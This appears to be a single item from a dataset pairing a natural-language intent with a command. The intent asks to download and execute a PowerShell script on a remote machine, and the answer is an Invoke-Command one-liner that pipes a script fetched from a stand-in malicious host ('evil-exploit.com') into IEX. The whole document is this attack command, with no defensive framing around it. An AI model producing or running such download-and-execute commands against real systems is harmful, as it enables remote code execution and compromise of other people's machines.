# Natural language intent:
# Download and execute a PowerShell script from a remote server on a specified IP.

Invoke-Command -ComputerName [IP] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://evil-exploit.com/exploitWin.ps1')}
